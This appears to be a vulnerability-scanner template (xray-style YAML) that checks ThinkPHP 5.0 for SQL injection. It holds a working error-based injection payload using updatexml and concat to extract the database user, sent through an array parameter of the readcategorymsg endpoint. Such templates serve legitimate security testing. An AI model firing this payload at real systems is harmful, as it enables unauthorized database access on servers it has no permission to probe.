name: poc-yaml-thinkphp5-sqli
set:
  r1: randomInt(20000, 21000)
rules:
  - method: GET
    path: /Home/Index/readcategorymsg?category[0]=bind&category[1]=0 and (updatexml({{r1}},concat(0x7e,(user()),0))
    follow_redirects: false
    expression:
      response.status == 404 && response.body.bcontains(bytes(string(r1)))
detail:
  author: elliot
  Affected Version: "ThinkPHP5.0"
  links: 
    - https://mp.weixin.qq.com/s/lNaH2-AAtk9JVKbbCBeIRA